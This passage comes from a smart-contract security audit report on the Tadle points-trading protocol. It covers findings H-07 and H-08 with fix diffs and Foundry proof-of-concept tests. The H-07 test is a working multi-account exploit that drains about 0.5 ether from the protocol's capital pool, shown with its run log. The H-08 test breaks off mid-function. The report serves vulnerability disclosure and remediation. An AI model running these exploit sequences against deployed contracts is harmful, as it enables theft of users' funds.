        uint256 platformFee = depositAmount * platformFeeRate / Constants.PLATFORM_FEE_DECIMAL_SCALER;
        
        ReferralInfo memory referralInfo = systemConfig.getReferralInfo(taker1);
        expectedReferrerBonus = (platformFee * referralInfo.referrerRate) / Constants.REFERRAL_RATE_DECIMAL_SCALER;
        expectedTakerBonus = (platformFee * referralInfo.authorityRate) / Constants.REFERRAL_RATE_DECIMAL_SCALER;

        return (expectedReferrerBonus, expectedTakerBonus);
    }

    function calculateExpectedSalesRevenue(address offerAddr, uint256 purchasedPoints) internal view returns (uint256 expectedSalesRevenue) {
        OfferInfo memory offerInfo = preMarktes.getOfferInfo(offerAddr);
        
        expectedSalesRevenue = purchasedPoints * offerInfo.amount / offerInfo.points;
        
        return expectedSalesRevenue;
    }

    function calculateExpectedTaxIncome(address offerAddr, bool isMaker, address _maker, uint256 depositAmount) internal view returns (uint256 expectedTaxIncome) {
        uint256 tradeTax = isMaker? preMarktes.getMakerInfo(_maker).eachTradeTax : preMarktes.getOfferInfo(offerAddr).tradeTax;
        assertGt(tradeTax, 0, "Trade tax should be greater than 0");
        
        expectedTaxIncome = (depositAmount * tradeTax) / Constants.EACH_TRADE_TAX_DECIMAL_SCALER;
        return expectedTaxIncome;
    }
}
```

## Impact

Likelihood: HIGH
Impact: HIGH
Severity: HIGH

## Tools Used

Manual Review and Foundry Testing.

## Recommendations

Update the `abortBidTaker()` function to use the correct formula for calculating the deposit amount:
`uint256 depositAmount = stockInfo.points.mulDiv(preOfferInfo.amount, preOfferInfo.points, Math.Rounding.Floor);`. An example implementation is shown below;

```solidity
/**
     * @notice abort bid taker
     * @param _stock stock address
     * @param _offer offer address
     * @notice Only offer owner can abort bid taker
     * @dev Only offer abort status is aborted can be aborted
     * @dev Update stock authority refund amount
     */
    function abortBidTakerFixed(address _stock, address _offer) external {
        StockInfo storage stockInfo = stockInfoMap[_stock];
        OfferInfo storage preOfferInfo = offerInfoMap[_offer];

        if (stockInfo.authority != _msgSender()) {
            revert Errors.Unauthorized();
        }

        if (stockInfo.preOffer != _offer) {
            revert InvalidOfferAccount(stockInfo.preOffer, _offer);
        }

        if (stockInfo.stockStatus != StockStatus.Initialized) {
            revert InvalidStockStatus(
                StockStatus.Initialized,
                stockInfo.stockStatus
            );
        }

        if (preOfferInfo.abortOfferStatus != AbortOfferStatus.Aborted) {
            revert InvalidAbortOfferStatus(
                AbortOfferStatus.Aborted,
                preOfferInfo.abortOfferStatus
            );
        }

        uint256 depositAmount = stockInfo.points.mulDiv(
            preOfferInfo.amount,
            preOfferInfo.points, // @audit - FIX: pointsPurchased * offerInfo.amount / totalPoints, however this doesn't account for funds lost due to sales tax, referral or platform fees.
            Math.Rounding.Floor
        );

        uint256 transferAmount = OfferLibraries.getDepositAmount(
            preOfferInfo.offerType,
            preOfferInfo.collateralRate,
            depositAmount,
            false,
            Math.Rounding.Floor
        );

        MakerInfo storage makerInfo = makerInfoMap[preOfferInfo.maker];
        ITokenManager tokenManager = tadleFactory.getTokenManager();
        tokenManager.addTokenBalance(
            TokenBalanceType.MakerRefund,
            _msgSender(),
            makerInfo.tokenAddress,
            transferAmount
        );
        console.log("transferAmount", transferAmount);
        console.log("depositAmount", depositAmount);
        console.log("stockInfo.points", stockInfo.points);
        console.log("preOfferInfo.points", preOfferInfo.points);
        console.log("preOfferInfo.amount", preOfferInfo.amount);

        stockInfo.stockStatus = StockStatus.Finished;

        emit AbortBidTaker(_offer, _msgSender());
    }

```
## <a id='H-07'></a>H-07. Malicious user can drain protocol by bypassing `ASK` offer abortion validation in `Turbo` mode

_Submitted by [Hrom131](https://profiles.cyfrin.io/u/Hrom131), [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r), [0x5chn0uf](https://profiles.cyfrin.io/u/0x5chn0uf), [heaven1024](https://profiles.cyfrin.io/u/heaven1024), [matejdb](https://profiles.cyfrin.io/u/matejdb), [pavankv](https://profiles.cyfrin.io/u/pavankv), [Tomas0707](https://profiles.cyfrin.io/u/Tomas0707), [oxelmiguel](https://profiles.cyfrin.io/u/oxelmiguel), [gajiknownnothing](https://profiles.cyfrin.io/u/gajiknownnothing), [h2134](https://profiles.cyfrin.io/u/h2134), [eeyore](https://profiles.cyfrin.io/u/eeyore), [tamer](https://profiles.cyfrin.io/u/tamer), [tinnohofficial](https://profiles.cyfrin.io/u/tinnohofficial), [0xnbvc](https://profiles.cyfrin.io/u/0xnbvc), [0xHunter](https://profiles.cyfrin.io/u/0xHunter), [kwakudr](https://profiles.cyfrin.io/u/kwakudr), [vinica_boy](https://profiles.cyfrin.io/u/vinica_boy), [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb), [demorextess](https://profiles.cyfrin.io/u/demorextess), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [100HP](https://codehawks.cyfrin.io/team/clzlerf3j0009onp0zvsoyzzl), [Fortis Audits](https://codehawks.cyfrin.io/team/cly2eas2s000gpgez427qfcw9), [dadekuma](https://profiles.cyfrin.io/u/dadekuma), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [VaRuN](https://profiles.cyfrin.io/u/VaRuN), [marswhitehacker](https://profiles.cyfrin.io/u/marswhitehacker), [0xlookman](https://profiles.cyfrin.io/u/0xlookman), [Chad0](https://profiles.cyfrin.io/u/Chad0), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [recursiveeth](https://profiles.cyfrin.io/u/recursiveeth), [atharv181](https://profiles.cyfrin.io/u/atharv181), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [azanux](https://profiles.cyfrin.io/u/azanux), [456456](https://profiles.cyfrin.io/u/456456), [0xrststn](https://profiles.cyfrin.io/u/0xrststn), [bladesec](https://profiles.cyfrin.io/u/bladesec), [0xb0k0](https://profiles.cyfrin.io/u/0xb0k0), [jesjupyter](https://profiles.cyfrin.io/u/jesjupyter), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [dimah7](https://profiles.cyfrin.io/u/dimah7), [pascal](https://profiles.cyfrin.io/u/pascal), [pandasec](https://profiles.cyfrin.io/u/pandasec), [dinkras](https://profiles.cyfrin.io/u/dinkras). Selected submission by: [0xb0k0](https://profiles.cyfrin.io/u/0xb0k0)._      
            


## Summary

`Tadle` allows users to seamlessly trade points with collateral tokens. Sellers provide points guarded with deposited collateral, and buyers provide collateral with which they buy the set points. Users can also close or abort their offers if they decide that they no longer want to continue trading. When an offer is closed, it can then be re-listed with the same parameters. When an offer is aborted, it can't be relisted anymore. In the `Protected` mode, as there is only a single level of relisting, offers can be aborted at any time, however, in `Turbo` mode if an offer is re-listed, the initial offer cannot be aborted, as it provides the initial collateral for all subsequent listing. Due to an invalid use of `memory` instead of `storage`, this invariant can be broken.

## Vulnerability Details

Whenever an `ASK` offer is re-listed, the initial offer's `abortOfferStatus` is set to `AbortOfferStatus.SubOfferListed` so that it can no longer be aborted, as this offer is the main collateral provider for all subsequent listing. However, the current code logic uses `memory` instead of `storage` to apply this state change, meaning that the new state will not be preserved after the function call ends:

```solidity
function listOffer(
        address _stock,
        uint256 _amount,
        uint256 _collateralRate
    ) external payable {
__SNIP__

        /// @dev change abort offer status when offer settle type is turbo
        if (makerInfo.offerSettleType == OfferSettleType.Turbo) {
            address originOffer = makerInfo.originOffer;
@>            OfferInfo memory originOfferInfo = offerInfoMap[originOffer]; // state won't be preserved

            if (_collateralRate != originOfferInfo.collateralRate) {
                revert InvalidCollateralRate();
            }
            originOfferInfo.abortOfferStatus = AbortOfferStatus.SubOfferListed;
        }

__SNIP__
    }
```

Because of this, a malicious user can set up and drain protocol in three steps:

1. One user creates three separate accounts.
2. He/She creates an `ASK` offer in Turbo mode for 1000 points, at `1e18` amount and `15_000` collateral. There will be an initial collateral deposit of `15e17`.
3. He then accepts the `ASK` offer with his/her second account. He will deposit the required amount to buy the tokens - `1e18` + taxes. The initial account will have a `SalesRevenue` balance of `1e18` now.
4. The new `BID` stock is relisted as an `ASK` offer, but this time the user does not need to provide collateral.
5. He/She then uses his 3rd account to take the `ASK` offer. He/She deposits `1e18` with taxes. The second account now has `SalesRevenue of `1e18\`.
6. The user now calls `PreMarkets::abortAskOffer(...)` with his initial offer ID, meaning that the initial offer can no longer be settled. The initial account also receives `5e17` which is the overhead of his initial offer creation.
7. He then settles the second offer with `0` settled points.
8. He finally calls `PreMarkets::closeBidTaker(...)`, which refunds the initial collateral of `15e17`.
9. When the user combines his funds he acquired \~`0.5` ether - `4.9e17` due to platform tax. What is more, he gets to keep his points as well.

The below PoC shows how the exploit can occur. For the sake of the test, I have fixed the issue with the invalid point token address being passed when assigning `PointTokenBalance` to users. I have described this issue in my other issue `Users can drain the protocol by withdrawing collateral instead of points due to invalid point token address in DeliveryPlace::closeBidTaker(...) and DeliveryPlace::settleAskTaker(...)`. I have fixed the `PreMarkets.sol` contract name as it was `PreMarktes`. I also use a helper function added in `TokenManager.sol`:

```solidity
 function getUserAccountBalance(address _accountAddress, address _tokenAddress, TokenBalanceType _tokenBalanceType)
        external
        view
        returns (uint256)
    {
        return userTokenBalanceMap[_accountAddress][_tokenAddress][_tokenBalanceType];
    }
```

The following test can be run by adding the snippets in `PreMarkets.t.sol` and running `forge test --mt testImproperStateChange -vv`. I am using the following setup for the tests:

<details>

<summary> Set-up </summary>

```solidity
function setUp() public {
        // deploy mocks
        weth9 = new WETH9();

        TadleFactory tadleFactory = new TadleFactory(user1);

        mockUSDCToken = new MockERC20Token();
        mockPointToken = new MockERC20Token();

        SystemConfig systemConfigLogic = new SystemConfig();
        CapitalPool capitalPoolLogic = new CapitalPool();
        TokenManager tokenManagerLogic = new TokenManager();
        PreMarkets preMarketsLogic = new PreMarkets();
        DeliveryPlace deliveryPlaceLogic = new DeliveryPlace();

        bytes memory deploy_data = abi.encodeWithSelector(INITIALIZE_OWNERSHIP_SELECTOR, user1);
        vm.startPrank(user1);

        address systemConfigProxy =
            tadleFactory.deployUpgradeableProxy(1, address(systemConfigLogic), bytes(deploy_data));

        address preMarketsProxy = tadleFactory.deployUpgradeableProxy(2, address(preMarketsLogic), bytes(deploy_data));
        address deliveryPlaceProxy =
            tadleFactory.deployUpgradeableProxy(3, address(deliveryPlaceLogic), bytes(deploy_data));
        address capitalPoolProxy = tadleFactory.deployUpgradeableProxy(4, address(capitalPoolLogic), bytes(deploy_data));
        address tokenManagerProxy =
            tadleFactory.deployUpgradeableProxy(5, address(tokenManagerLogic), bytes(deploy_data));

        vm.stopPrank();
        // attach logic
        systemConfig = SystemConfig(systemConfigProxy);
        capitalPool = CapitalPool(capitalPoolProxy);
        tokenManager = TokenManager(tokenManagerProxy);
        preMarkets = PreMarkets(preMarketsProxy);
        deliveryPlace = DeliveryPlace(deliveryPlaceProxy);

        vm.startPrank(user1);
        // initialize
        systemConfig.initialize(basePlatformFeeRate, baseReferralRate);
        tokenManager.initialize(address(weth9));
        address[] memory tokenAddressList = new address[](2);

        tokenAddressList[0] = address(mockUSDCToken);
        tokenAddressList[1] = address(weth9);

        tokenManager.updateTokenWhiteListed(tokenAddressList, true);

        // create market place
        systemConfig.createMarketPlace("Backpack", false);
        systemConfig.updateMarket("Backpack", address(mockUSDCToken), 0.01 * 1e18, block.timestamp - 1, 3600);
        vm.stopPrank();

        deal(address(mockUSDCToken), user, 10000 * 10 ** 18);
        deal(address(mockPointToken), user, 10000 * 10 ** 18);
        deal(user, 100 * 10 ** 18);

        deal(address(mockUSDCToken), user1, 10000 * 10 ** 18);
        deal(address(mockUSDCToken), user2, 10000 * 10 ** 18);
        deal(address(mockUSDCToken), user3, 10000 * 10 ** 18);

        deal(address(mockPointToken), user2, 10000 * 10 ** 18);
        deal(address(mockPointToken), user3, 10000 * 10 ** 18);

        marketPlace = GenerateAddress.generateMarketPlaceAddress("Backpack");

        vm.warp(1719826275);

        vm.prank(user);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);
        vm.prank(user);
        mockPointToken.approve(address(tokenManager), type(uint256).max);

        vm.startPrank(user2);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);
        mockPointToken.approve(address(tokenManager), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(user3);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);
        mockPointToken.approve(address(tokenManager), type(uint256).max);
        vm.stopPrank();

        capitalPool.approve(address(mockUSDCToken));
        capitalPool.approve(address(mockPointToken));

        deal(address(mockUSDCToken), address(capitalPool), 10000 * 10 ** 18); // deal some additional collateral amount so that the protocol has enough to handle transactions
    }

```

</details>

<details>

<summary> PoC </summary>

```Solidity
function testImproperStateChange() public {
        uint256 initialCapitalPoolBalance = mockUSDCToken.balanceOf(address(capitalPool));

        console.log("User token balance before all:", mockUSDCToken.balanceOf(user));
        console.log("User point token balance before all:", mockPointToken.balanceOf(user));
        console.log("User point token balance before all:", mockUSDCToken.balanceOf(user));
        console.log("User2 token balance before all:", mockUSDCToken.balanceOf(user2));
        console.log("User2 point token balance before all:", mockPointToken.balanceOf(user2));
        console.log("User3 token balance before all:", mockUSDCToken.balanceOf(user3));
        console.log("User3 point token balance before all:", mockPointToken.balanceOf(user3));

        console.log("--------------------");

        console.log("Capital pool balance before all:", mockUSDCToken.balanceOf(address(capitalPool)));
        console.log("Capital pool point token balance before all:", mockPointToken.balanceOf(address(capitalPool)));
        console.log("Token manager balance before all:", mockUSDCToken.balanceOf(address(tokenManager)));
        console.log("Token manager point token balance before all:", mockPointToken.balanceOf(address(tokenManager)));

        console.log("--------------------");

        vm.prank(user);
        preMarkets.createOffer(
            CreateOfferParams(
                marketPlace, address(mockUSDCToken), 1000, 1e18, 15000, 300, OfferType.Ask, OfferSettleType.Turbo
            )
        ); // user wants to sell 1000 points, so he/she provides 15e17 collateral

        address offerAddrUserTurbo = GenerateAddress.generateOfferAddress(0);
        vm.prank(user2);
        preMarkets.createTaker(offerAddrUserTurbo, 1000); // the same user uses a second account to buy the points, provides 1e18 collateral + tax

        address stockAddrUser2Turbo = GenerateAddress.generateStockAddress(1);
        vm.prank(user2);
        preMarkets.listOffer(stockAddrUser2Turbo, 1e18, 15000); // user2 lists the points for sale, and does not provide collateral as it is in Turbo mode

        address offerAddrUser2Turbo = GenerateAddress.generateOfferAddress(1);
        vm.prank(user3);
        preMarkets.createTaker(offerAddrUser2Turbo, 1000); // the same user uses a third account to buy the points, provides 1e18 collateral + tax

        uint256 capitalPoolBalanceBeforeAbort = initialCapitalPoolBalance + 357e16; // total capital pool balance after the malicious user actions

        assertEq(mockUSDCToken.balanceOf(address(capitalPool)), capitalPoolBalanceBeforeAbort); // Capital Pool at the end of the malicious user actions

        address stockAddrUserTurbo = GenerateAddress.generateStockAddress(0);
        vm.prank(user);
        preMarkets.abortAskOffer(stockAddrUserTurbo, offerAddrUserTurbo); // the initial offer is now aborted, and user is refunded 5e17 collateral

        vm.prank(user1);
        systemConfig.updateMarket("Backpack", address(mockPointToken), 1e18, block.timestamp - 1, 3600);

        vm.prank(user1);
        systemConfig.updateMarketPlaceStatus("Backpack", MarketPlaceStatus.AskSettling);

        vm.prank(user);
        vm.expectRevert(IDeliveryPlace.InvalidOfferStatus.selector);
        deliveryPlace.settleAskMaker(offerAddrUserTurbo, 0);

        vm.prank(user2);
        deliveryPlace.settleAskMaker(offerAddrUser2Turbo, 0); // user2 settles the offer, but does not provide any points

        vm.prank(user3);
        address stockAddr2User2Turbo = GenerateAddress.generateStockAddress(2);
        deliveryPlace.closeBidTaker(stockAddr2User2Turbo); // when user 3 closes the bid, he/she gets the full original collatera of 15e17

        console.log("--------------------");

        console.log(
            "Capital pool balance before malicious user withdraw:", mockUSDCToken.balanceOf(address(capitalPool))
        );
        console.log(
            "Capital pool point token balance before malicious user withdraw:",
            mockPointToken.balanceOf(address(capitalPool))
        );
        console.log(
            "Token manager balance after before malicious user withdraw:",
            mockUSDCToken.balanceOf(address(tokenManager))
        );
        console.log(
            "Token manager point token balance before malicious user withdraw:",
            mockPointToken.balanceOf(address(tokenManager))
        );

        console.log("--------------------");

        console.log(
            "User tax income",
            tokenManager.getUserAccountBalance(user, address(mockUSDCToken), TokenBalanceType.TaxIncome)
        );
        console.log(
            "User sales revenue",
            tokenManager.getUserAccountBalance(user, address(mockUSDCToken), TokenBalanceType.SalesRevenue)
        );
        console.log(
            "User point token with point token address",
            tokenManager.getUserAccountBalance(user, address(mockPointToken), TokenBalanceType.PointToken)
        );
        console.log(
            "User maker refund",
            tokenManager.getUserAccountBalance(user, address(mockUSDCToken), TokenBalanceType.MakerRefund)
        );
        console.log(
            "User remianing cash",
            tokenManager.getUserAccountBalance(user, address(mockUSDCToken), TokenBalanceType.RemainingCash)
        );

        console.log("--------------------");

        console.log(
            "User2 tax income",
            tokenManager.getUserAccountBalance(user2, address(mockUSDCToken), TokenBalanceType.TaxIncome)
        );
        console.log(
            "User2 sales revenue",
            tokenManager.getUserAccountBalance(user2, address(mockUSDCToken), TokenBalanceType.SalesRevenue)
        );
        console.log(
            "User2 point token with point token address",
            tokenManager.getUserAccountBalance(user2, address(mockPointToken), TokenBalanceType.PointToken)
        );
        console.log(
            "User2 maker refund",
            tokenManager.getUserAccountBalance(user2, address(mockUSDCToken), TokenBalanceType.MakerRefund)
        );
        console.log(
            "User2 remianing cash",
            tokenManager.getUserAccountBalance(user2, address(mockUSDCToken), TokenBalanceType.RemainingCash)
        );

        console.log("--------------------");

        console.log(
            "User3 tax income",
            tokenManager.getUserAccountBalance(user3, address(mockUSDCToken), TokenBalanceType.TaxIncome)
        );
        console.log(
            "User3 sales revenue",
            tokenManager.getUserAccountBalance(user3, address(mockUSDCToken), TokenBalanceType.SalesRevenue)
        );
        console.log(
            "User3 point token with point token address",
            tokenManager.getUserAccountBalance(user3, address(mockPointToken), TokenBalanceType.PointToken)
        );
        console.log(
            "User3 maker refund",
            tokenManager.getUserAccountBalance(user3, address(mockUSDCToken), TokenBalanceType.MakerRefund)
        );
        console.log(
            "User3 remianing cash",
            tokenManager.getUserAccountBalance(user3, address(mockUSDCToken), TokenBalanceType.RemainingCash)
        );

        uint256 maliciousUserProceedsFromAttack = tokenManager.getUserAccountBalance(
            user, address(mockUSDCToken), TokenBalanceType.TaxIncome
        ) + tokenManager.getUserAccountBalance(user, address(mockUSDCToken), TokenBalanceType.SalesRevenue)
            + tokenManager.getUserAccountBalance(user, address(mockUSDCToken), TokenBalanceType.MakerRefund)
            + tokenManager.getUserAccountBalance(user2, address(mockUSDCToken), TokenBalanceType.SalesRevenue)
            + tokenManager.getUserAccountBalance(user3, address(mockUSDCToken), TokenBalanceType.RemainingCash);

        assertEq(maliciousUserProceedsFromAttack, 406e16);

        vm.startPrank(user);
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.TaxIncome);
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.SalesRevenue);
        tokenManager.withdraw(address(mockPointToken), TokenBalanceType.PointToken);
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.MakerRefund);
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.RemainingCash);
        vm.stopPrank();

        vm.startPrank(user2);
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.TaxIncome);
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.SalesRevenue);
        tokenManager.withdraw(address(mockPointToken), TokenBalanceType.PointToken);
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.MakerRefund);
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.RemainingCash);
        vm.stopPrank();

        vm.startPrank(user3);
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.TaxIncome);
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.SalesRevenue);
        tokenManager.withdraw(address(mockPointToken), TokenBalanceType.PointToken);
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.MakerRefund);
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.RemainingCash);
        vm.stopPrank();

        console.log("User point token balance after user withdraw:", mockPointToken.balanceOf(user));
        console.log("User token balance after user withdraw:", mockUSDCToken.balanceOf(user));
        console.log("User2 token balance after after user withdraw:", mockUSDCToken.balanceOf(user2));
        console.log("User2 point token balance after user withdraw:", mockPointToken.balanceOf(user2));
        console.log("User3 token balance after after user withdraw:", mockUSDCToken.balanceOf(user3));
        console.log("User3 point token balance after user withdraw:", mockPointToken.balanceOf(user3));

        console.log("--------------------");

        console.log("Capital pool balance after user withdraw:", mockUSDCToken.balanceOf(address(capitalPool)));
        console.log(
            "Capital pool point token balance after user withdraw:", mockPointToken.balanceOf(address(capitalPool))
        );
        console.log("Token manager balance after after user withdraw:", mockUSDCToken.balanceOf(address(tokenManager)));
        console.log(
            "Token manager point token balance after user withdraw:", mockPointToken.balanceOf(address(tokenManager))
        );

        console.log("--------------------");

        assertEq(maliciousUserProceedsFromAttack - 357e16, 490000000000000000); // User has gained ~0.5 ether and has kept all his points
    }
```

```bash
Ran 1 test for test/PreMarkets.t.sol:PreMarketsTest
[PASS] testImproperStateChange() (gas: 1703054)
Logs:
  User token balance before all: 10000000000000000000000
  User point token balance before all: 10000000000000000000000
  User point token balance before all: 10000000000000000000000
  User2 token balance before all: 10000000000000000000000
  User2 point token balance before all: 10000000000000000000000
  User3 token balance before all: 10000000000000000000000
  User3 point token balance before all: 10000000000000000000000
  --------------------
  Capital pool balance before all: 10000000000000000000000
  Capital pool point token balance before all: 0
  Token manager balance before all: 0
  Token manager point token balance before all: 0
  --------------------
  --------------------
  Capital pool balance before malicious user withdraw: 10003570000000000000000
  Capital pool point token balance before malicious user withdraw: 0
  Token manager balance after before malicious user withdraw: 0
  Token manager point token balance before malicious user withdraw: 0
  --------------------
  User tax income 60000000000000000
  User sales revenue 1000000000000000000
  User point token with point token address 0
  User maker refund 500000000000000000
  User remianing cash 0
  --------------------
  User2 tax income 0
  User2 sales revenue 1000000000000000000
  User2 point token with point token address 0
  User2 maker refund 0
  User2 remianing cash 0
  --------------------
  User3 tax income 0
  User3 sales revenue 0
  User3 point token with point token address 0
  User3 maker refund 0
  User3 remianing cash 1500000000000000000
  User point token balance after user withdraw: 10000000000000000000000
  User token balance after user withdraw: 10000060000000000000000
  User2 token balance after after user withdraw: 9999965000000000000000
  User2 point token balance after user withdraw: 10000000000000000000000
  User3 token balance after after user withdraw: 10000465000000000000000
  User3 point token balance after user withdraw: 10000000000000000000000
  --------------------
  Capital pool balance after user withdraw: 9999510000000000000000
  Capital pool point token balance after user withdraw: 0
  Token manager balance after after user withdraw: 0
  Token manager point token balance after user withdraw: 0
  --------------------

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.67ms (2.83ms CPU time)

Ran 1 test suite in 160.58ms (13.67ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

</details>

## Impact

A malicious user can drain the protocol.

## Tools Used

Manual review

## Recommendations

Use `storage` over `memory` when the state needs to be preserved after the function call ends.

```diff
@@ -334,7 +334,7 @@ contract PreMarktes is PerMarketsStorage, Rescuable, Related, IPerMarkets {
         /// @dev change abort offer status when offer settle type is turbo
         if (makerInfo.offerSettleType == OfferSettleType.Turbo) {
             address originOffer = makerInfo.originOffer;
-            OfferInfo memory originOfferInfo = offerInfoMap[originOffer];
+            OfferInfo storage originOfferInfo = offerInfoMap[originOffer];
 
             if (_collateralRate != originOfferInfo.collateralRate) {
                 revert InvalidCollateralRate();
```

## <a id='H-08'></a>H-08. The `DeliveryPlace::settleAskTaker()` function mistakenly uses `makerInfo.tokenAddress` to update the `TokenBalanceType.PointToken` in the `userTokenBalanceMap` mapping, leading to a critical error.

_Submitted by [danielwang8824](https://profiles.cyfrin.io/u/danielwang8824), [Tomas0707](https://profiles.cyfrin.io/u/Tomas0707), [heaven1024](https://profiles.cyfrin.io/u/heaven1024), [eeyore](https://profiles.cyfrin.io/u/eeyore), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [touthang](https://profiles.cyfrin.io/u/touthang), [h2134](https://profiles.cyfrin.io/u/h2134), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [vinica_boy](https://profiles.cyfrin.io/u/vinica_boy), [robertodf99](https://profiles.cyfrin.io/u/robertodf99), [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb), [100HP](https://codehawks.cyfrin.io/team/clzlerf3j0009onp0zvsoyzzl), [0xlrivo](https://profiles.cyfrin.io/u/0xlrivo), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [bigsam](https://profiles.cyfrin.io/u/bigsam), [fyamf](https://profiles.cyfrin.io/u/fyamf), [aksoy](https://profiles.cyfrin.io/u/aksoy), [dadekuma](https://profiles.cyfrin.io/u/dadekuma), [0xb0k0](https://profiles.cyfrin.io/u/0xb0k0), [josh4324](https://profiles.cyfrin.io/u/josh4324), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [rbserver](https://profiles.cyfrin.io/u/rbserver), [zer0](https://profiles.cyfrin.io/u/zer0), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [dustinhuel2](https://profiles.cyfrin.io/u/dustinhuel2), [_frolic](https://profiles.cyfrin.io/u/_frolic), [joyboy03](https://profiles.cyfrin.io/u/joyboy03), [simon0417](https://profiles.cyfrin.io/u/simon0417), [0xrststn](https://profiles.cyfrin.io/u/0xrststn), [honour](https://profiles.cyfrin.io/u/honour), [schereo](https://profiles.cyfrin.io/u/schereo), [bladesec](https://profiles.cyfrin.io/u/bladesec), [avci](https://profiles.cyfrin.io/u/avci), [0x1912](https://profiles.cyfrin.io/u/0x1912), [kupiasec](https://profiles.cyfrin.io/u/kupiasec), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [stanchev](https://profiles.cyfrin.io/u/stanchev), [0xphantom](https://profiles.cyfrin.io/u/0xphantom), [pontifex](https://profiles.cyfrin.io/u/pontifex), [tchkvsky](https://profiles.cyfrin.io/u/tchkvsky). Selected submission by: [joicygiore](https://profiles.cyfrin.io/u/joicygiore)._      
            


## Summary

The `DeliveryPlace::settleAskTaker()` function mistakenly uses `makerInfo.tokenAddress` to update the `TokenBalanceType.PointToken` in the `userTokenBalanceMap` mapping, leading to a critical error.

## Vulnerability Details

When UserA creates a `Bid.offer`, the transaction process unfolds as follows:

1. UserA creates a `Bid.offer` by calling `PreMarkets::createOffer()`.
2. UserB calls `PreMarkets::createTaker()` using the `Bid.offer.offerAddr` and a specified amount.
3. The administrator updates the market by calling `SystemConfig::updateMarket`.
4. UserB then calls `DeliveryPlace::settleAskTaker()` to settle the transaction. During this step, UserB transfers `mockPointToken` to the contract, fulfilling the amount promised in step 2, and updates the balance information in `userTokenBalanceMap`.

Below is the relevant code from `DeliveryPlace::settleAskTaker()`:

```js
    function settleAskTaker(address _stock, uint256 _settledPoints) external {
        IPerMarkets perMarkets = tadleFactory.getPerMarkets();
        StockInfo memory stockInfo = perMarkets.getStockInfo(_stock);


        (
            OfferInfo memory offerInfo,
            MakerInfo memory makerInfo,
            MarketPlaceInfo memory marketPlaceInfo,
            MarketPlaceStatus status
        ) = getOfferInfo(stockInfo.preOffer);

        // SNIP...


        uint256 settledPointTokenAmount = marketPlaceInfo.tokenPerPoint *
            _settledPoints;
        ITokenManager tokenManager = tadleFactory.getTokenManager();
        if (settledPointTokenAmount > 0) {
            tokenManager.tillIn(
                _msgSender(),
                marketPlaceInfo.tokenAddress,
                settledPointTokenAmount,
                true
            );


            tokenManager.addTokenBalance(
                TokenBalanceType.PointToken,
@>                offerInfo.authority,
@>                makerInfo.tokenAddress,
                settledPointTokenAmount
            );
        }
        // SNIP...
    }
```

In the above code, `tokenManager.addTokenBalance()` incorrectly uses `makerInfo.tokenAddress` when updating the `TokenBalanceType.PointToken` balance for the user. Instead, the `marketPlaceInfo.tokenAddress` should be used. This misstep leads to an incorrect balance being recorded in the `userTokenBalanceMap`, which could result in serious errors during settlement.

### Poc

To demonstrate the issue, add the following test code to `test/PreMarkets.t.sol` and run it:

Note: Before running the PoC, address the issue related to the incorrect permission check in the `DeliveryPlace::settleAskTaker()` function, where the caller's address is mistakenly validated against the wrong authority.

```js
    function test_DeliveryPlace_settleAskTaker_addTokenBalance_error() public {

        ///////////////////////////
        // user create Bid.Offer //
        ///////////////////////////
        vm.prank(user);
        // transfer mockUSDCToken 1e16 to capitalPool
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000, 
                0.01 * 1e18, 
                12000, 
                300, 
                OfferType.Bid,
                OfferSettleType.Turbo
            )
        );

        // Cache user's offer address
        address offerAddr = GenerateAddress.generateOfferAddress(0);
        ////////////////////////
        // user2 create Taker //
        ////////////////////////
        vm.prank(user2);
        // transfer mockUSDCToken 1.235e16 to capitalPool
        preMarktes.createTaker(offerAddr, 1000);

        // Cache user2's stock address
        address user2StockAddr = GenerateAddress.generateStockAddress(1);
        

        ////////////////////////
        // admin updateMarket //
        ////////////////////////
        vm.prank(user1);
        systemConfig.updateMarket(
            "Backpack",
            address(mockPointToken),
            0.01 * 1e18,
            block.timestamp - 1,
            3600
        );

        //////////////////////////
        // user2 settleAskTaker //
        //////////////////////////       
        vm.startPrank(user2);
        mockPointToken.approve(address(tokenManager), 10000 * 10 ** 18);

        // transfer mockPointToken 1e19 to capitalPool
        deliveryPlace.settleAskTaker(user2StockAddr, 1000);
        vm.stopPrank();

        //////////////////////////
        //  check user balance  //
        //////////////////////////
        // user
        uint256 usermockPointTokenAmount_PointToken = tokenManager.userTokenBalanceMap(
            address(user),
            address(mockPointToken),
            TokenBalanceType.PointToken
        );
